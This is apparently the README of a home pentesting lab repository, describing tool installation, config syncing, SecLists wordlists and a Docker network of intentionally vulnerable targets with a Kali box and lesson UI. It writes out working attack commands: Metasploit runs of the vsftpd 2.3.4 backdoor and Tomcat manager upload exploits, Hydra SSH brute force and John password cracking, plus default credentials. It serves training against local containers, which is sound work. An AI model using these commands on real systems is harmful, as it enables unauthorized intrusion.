<p align="center">
  <img src="assets/wireparkhackerz-logo.png" alt="WireParkHackerz" width="150"/>
</p>

<h1 align="center">
  ⚡ P3N73S7 L4B ⚡
</h1>

<p align="center">
  <b>[ Portable Pentesting Environment ]</b><br>
  <i>Clone → Install → Pwn</i>
</p>

```
    ██╗    ██╗██╗██████╗ ███████╗██████╗  █████╗ ██████╗ ██╗  ██╗
    ██║    ██║██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝
    ██║ █╗ ██║██║██████╔╝█████╗  ██████╔╝███████║██████╔╝█████╔╝
    ██║███╗██║██║██╔══██╗██╔══╝  ██╔═══╝ ██╔══██║██╔══██╗██╔═██╗
    ╚███╔███╔╝██║██║  ██║███████╗██║     ██║  ██║██║  ██║██║  ██╗
     ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
                    H A C K E R Z
```

---

## 0x00 // WTF IS THIS?

This repo **captures your entire pentesting environment**.

- Clone it on a fresh Mac
- Run `./install.sh`
- All your tools, configs, and targets are restored

**Not a script. Not an app. An ENVIRONMENT.**

---

## 0x01 // INSTALL THESE FIRST (Required)

> This repo syncs CONFIGS, not tools. Install these manually:

```bash
# ═══════════════════════════════════════════════════════
# CORE ARSENAL
# ═══════════════════════════════════════════════════════
brew install metasploit nmap

# SET (Social Engineering Toolkit)
git clone https://github.com/trustedsec/social-engineer-toolkit.git ~/set
pip3 install --user --break-system-packages -r ~/set/requirements.txt

# ═══════════════════════════════════════════════════════
# EXTENDED ARSENAL
# ═══════════════════════════════════════════════════════
brew install hydra john-jumbo sqlmap nikto gobuster hashcat wireshark

# Docker Desktop - download from docker.com
```

### Tool Matrix

| Tool | Command | Purpose | Config Saved? |
|------|---------|---------|:-------------:|
| **Metasploit** | `msfconsole` / `ms` | Exploitation framework | ✓ |
| **SET** | `settool` | Social engineering | ✓ |
| **Hydra** | `hydra` | Brute force services | - |
| **John** | `john` | Crack password hashes | - |
| **SQLMap** | `sqlmap` | SQL injection | - |
| **Nmap** | `nmap` | Port scanning | - |
| **Nikto** | `nikto` | Web server scanner | - |
| **Gobuster** | `gobuster` | Directory brute force | - |

---

## 0x02 // QUICK START

```bash
# Clone with wordlists
git clone --recursive git@github.com:nixfred/metasploit.git ~/Projects/metasploit
cd ~/Projects/metasploit

# Link your configs
./install.sh

# Spin up a target
docker-compose up vsftpd -d

# GET ROOT
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 172.20.0.15; run"
```

---

## 0x03 // PROJECT STRUCTURE

```
┌──────────────────────────────────────────────────────────────┐
│  YOUR MAC (fresh install)                                    │
│  ┌────────────────────────────────────────────────────────┐  │
│  │  brew install metasploit nmap hydra john-jumbo...      │  │
│  │  git clone ~/set                                        │  │
│  └────────────────────────────────────────────────────────┘  │
│                            │                                  │
│                            ▼                                  │
│  ┌────────────────────────────────────────────────────────┐  │
│  │  THIS REPO                                              │  │
│  │  ┌──────────────────┐  ┌──────────────────┐            │  │
│  │  │  msf-dotfiles/   │  │  wordlists/      │            │  │
│  │  │  → ~/.msf4/      │  │  → SecLists      │            │  │
│  │  └──────────────────┘  └──────────────────┘            │  │
│  │  ┌──────────────────┐  ┌──────────────────┐            │  │
│  │  │  set-config/     │  │  docker-compose  │            │  │
│  │  │  → SET configs   │  │  → 13 targets    │            │  │
│  │  └──────────────────┘  └──────────────────┘            │  │
│  └────────────────────────────────────────────────────────┘  │
│                            │                                  │
│                   ./install.sh                                │
│                            │                                  │
│                            ▼                                  │
│             CONFIGS SYMLINKED → TOOLS CUSTOMIZED              │
│                     READY TO PWN                              │
└──────────────────────────────────────────────────────────────┘
```

```
metasploit/
├── assets/                    # Logos, images
├── msf-dotfiles/              # Metasploit configs
│   ├── msfconsole.rc          # Startup commands
│   ├── modules/               # Custom exploits
│   ├── plugins/               # Plugins
│   └── scripts/               # Resource scripts (.rc)
├── set-config/                # SET configuration
├── wordlists/
│   └── seclists/              # SecLists (submodule)
├── targets/                   # Custom target configs
├── lab-ui/                    # Web UI with guided lessons
├── kali/                      # Kali attack box Dockerfile
├── HISTORY.md                 # Project evolution log
├── docs/
│   ├── CHEATSHEET.md          # Exploit commands
│   └── MS_CUSTOMIZATION.md    # Full MS reference
├── docker-compose.yml         # 13 targets + Kali + Dozzle
├── install.sh                 # Symlink configs
└── uninstall.sh               # Remove symlinks
```

---

## 0x04 // SECLISTS SUBMODULE (How It Works)

SecLists is linked via **Git Submodule** - a pointer to another repo:

```
YOUR REPO (small)                    SECLISTS REPO (1.5GB)
┌─────────────────┐                  ┌─────────────────────┐
│ wordlists/      │                  │ danielmiessler/     │
│   seclists/ ────┼──── POINTER ────►│ SecLists            │
│   (just a link) │                  │ (full wordlists)    │
└─────────────────┘                  └─────────────────────┘
```

**Benefits:**
- Your repo stays small (~1MB vs 1.5GB)
- SecLists updates from upstream with one command
- You never need to maintain the wordlists

**Commands:**
```bash
# Clone with submodules
git clone --recursive <repo>

# Or if already cloned:
git submodule init && git submodule update

# Update SecLists to latest
git submodule update --remote wordlists/seclists
```

**Using wordlists:**
```bash
hydra -l root -P wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://172.20.0.17
john --wordlist=wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt
```

---

## 0x05 // TARGET NETWORK

```
┌─────────────────────────────────────────────────────────────────────────┐
│  VULNERABLE NETWORK: 172.20.0.0/24                                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  YOUR MAC ───────────────────────────────────────────┐                  │
│  172.20.0.1 (gateway)                                │                  │
│  msfconsole, hydra, john, nmap, sqlmap               │                  │
│                                                      ▼                  │
│  ┌────────────────────────────────────────────────────────────────┐    │
│  │                     T4RG3TS                                     │    │
│  ├────────────────────────────────────────────────────────────────┤    │
│  │ .10  DVWA             │ SQLi, XSS, Command Injection           │    │
│  │ .15  vsftpd 2.3.4     │ BACKDOOR - EASY ROOT                   │    │
│  │ .16  SambaCry         │ CVE-2017-7494                          │    │
│  │ .17  Vuln SSH         │ Brute force → Hydra/John               │    │
│  │ .18  MySQL            │ root/root                              │    │
│  │ .19  Tomcat           │ Manager upload                         │    │
│  │ .20  Metasploitable2  │ Multi-vuln classic                     │    │
│  │ .30  Juice Shop       │ Modern OWASP Top 10                    │    │
│  │ .40  WebGoat          │ OWASP training                         │    │
│  │ .50  Mutillidae       │ OWASP practice                         │    │
│  │ .60  WordPress        │ Plugin vulns                           │    │
│  │ .70  bWAPP            │ 100+ web vulns                         │    │
│  │ .100 Cowrie           │ Honeypot                               │    │
│  └────────────────────────────────────────────────────────────────┘    │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Start Targets
```bash
docker-compose up vsftpd -d        # Easy win
docker-compose up dvwa vulnssh -d  # Web + brute force
docker-compose up -d               # ALL targets
docker-compose down                # Clean up
```

---

## 0x06 // QUICK EXPLOITS

### vsftpd 2.3.4 Backdoor (Start Here)
```
msf6> use exploit/unix/ftp/vsftpd_234_backdoor
msf6> set RHOSTS 172.20.0.15
msf6> run
# ═══ ROOT SHELL ═══
```

### SSH Brute Force (Hydra)
```bash
hydra -l root -P wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://172.20.0.17
# Creds: root/toor
```

### SSH Brute Force (John)
```bash
# If you have a hash:
john --wordlist=wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt shadow.txt
john --show shadow.txt
```

### Tomcat Manager Upload
```
msf6> use exploit/multi/http/tomcat_mgr_upload
msf6> set RHOSTS 172.20.0.19
msf6> set HttpUsername tomcat
msf6> set HttpPassword tomcat
msf6> run
```

**Full exploit list:** `docs/CHEATSHEET.md`

---

## 0x06.5 // LEARNING LAB WEB UI

A web interface with **embedded Kali terminal** and **guided lessons**.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  LESSON: FTP Backdoor          │  KALI TERMINAL                   [LIVE]   │
│  ────────────────────────────  │  ─────────────────────────────────────── │
│  Step 3: Load the exploit      │  root@kali:~# msfconsole                  │
│  ┌───────────────────────────┐ │  msf6 > use exploit/unix/ftp/vsftpd...   │
│  │ use exploit/unix/ftp/     │ │  msf6 > set RHOSTS 172.20.0.15           │
│  │ vsftpd_234_backdoor       │ │  msf6 > run                              │
│  │                    [COPY] │ │  [*] Command shell session 1 opened      │
│  └───────────────────────────┘ │  whoami                                   │
│                                │  root                                     │
│  [← PREV]         [NEXT →]     │                                           │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Start the Lab UI

```bash
# 1. Start Kali attack box (has web terminal)
docker-compose up kali -d

# 2. Start the web UI
cd lab-ui
pip3 install -r requirements.txt
python3 app.py

# 3. Open in browser
open http://localhost:5000
```

### What You Get

| URL | What It Is |
|-----|------------|
| http://localhost:5000 | Lab UI - lesson selector |
| http://localhost:7681 | Kali terminal (standalone) |
| http://localhost:9999 | Dozzle - Docker log viewer |

### Kali Attack Box (Always Running)

The Kali container is your **persistent attack platform**:
- **First build:** Slow (downloads all Kali tools)
- **After that:** Instant starts, everything persists
- **Auto-starts:** With Docker Desktop (which can auto-start on login)

**What's inside:**
- Metasploit, Nmap, Hydra, John, SQLMap, Nikto, Gobuster
- Web terminal via ttyd (accessible in browser!)
- **Persistent /root directory** - your configs, history, loot all survive reboots
- SecLists mounted at /root/wordlists

```bash
# First time only - build the Kali image
docker-compose up kali -d

# Access via browser (always)
open http://localhost:7681

# Or via docker exec
docker exec -it kali bash
```

**Make Docker Desktop auto-start:** System Preferences → Users & Groups → Login Items → Add Docker

---

## 0x07 // WHAT GETS SYNCED

| Synced (Version Controlled) | NOT Synced (Machine-Specific) |
|-----------------------------|-------------------------------|
| `msfconsole.rc` | `database.yml` |
| `modules/` | `db/` (PostgreSQL) |
| `plugins/` | `loot/` |
| `scripts/` | `history` |
| `logos/` | credentials |
| SET templates | - |

---

## 0x08 // NEW MAC SETUP

Complete checklist for a fresh Mac:

### Prerequisites (Manual Install)
```bash
# 1. Homebrew (package manager)
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# 2. Docker Desktop - download from https://docker.com
#    After install: Open Docker Desktop, let it start, close it
#    Enable auto-start: System Preferences → Users & Groups → Login Items → Add Docker

# 3. Python 3 (usually pre-installed, but verify)
python3 --version
```

### Install Pentesting Tools
```bash
# Core arsenal
brew install metasploit nmap

# Extended arsenal
brew install hydra john-jumbo sqlmap nikto gobuster hashcat wireshark

# Social Engineering Toolkit
git clone https://github.com/trustedsec/social-engineer-toolkit.git ~/set
pip3 install --user --break-system-packages -r ~/set/requirements.txt
```

### Clone This Repo
```bash
# Clone with SecLists submodule
git clone --recursive git@github.com:nixfred/metasploit.git ~/Projects/metasploit
cd ~/Projects/metasploit

# Link configs to your tools
./install.sh

# Verify Metasploit
msfconsole -q -x "db_status; exit"
```

### Build Kali Attack Box (One Time)
```bash
# This takes 10-15 mins first time (downloads all Kali tools)
docker-compose up kali -d

# After this, Kali auto-starts with Docker Desktop forever
# Access at http://localhost:7681
```

### Start Hacking
```bash
docker-compose up vsftpd -d   # Start a target
open http://localhost:7681     # Open Kali terminal
# or just: ms                  # Use Metasploit on Mac
```

---

## 0x09 // SHELL ALIASES

Add to `~/.bashrc`:
```bash
alias ms='msfconsole'
alias settool='cd ~/set && sudo python3 setoolkit'   # NOT 'set' - conflicts with bash builtin!
```

---

## 0xFF // LEGAL

```
 ██████╗ ███╗   ██╗██╗  ██╗   ██╗    ██╗      ██████╗  ██████╗ █████╗ ██╗
██╔═══██╗████╗  ██║██║  ╚██╗ ██╔╝    ██║     ██╔═══██╗██╔════╝██╔══██╗██║
██║   ██║██╔██╗ ██║██║   ╚████╔╝     ██║     ██║   ██║██║     ███████║██║
██║   ██║██║╚██╗██║██║    ╚██╔╝      ██║     ██║   ██║██║     ██╔══██║██║
╚██████╔╝██║ ╚████║███████╗██║       ███████╗╚██████╔╝╚██████╗██║  ██║███████╗
 ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝       ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝
```

All attacks target **localhost Docker containers only**.
Never use against systems without explicit authorization.

---

<p align="center">
  <b>// HACK THE PLANET //</b>
</p>
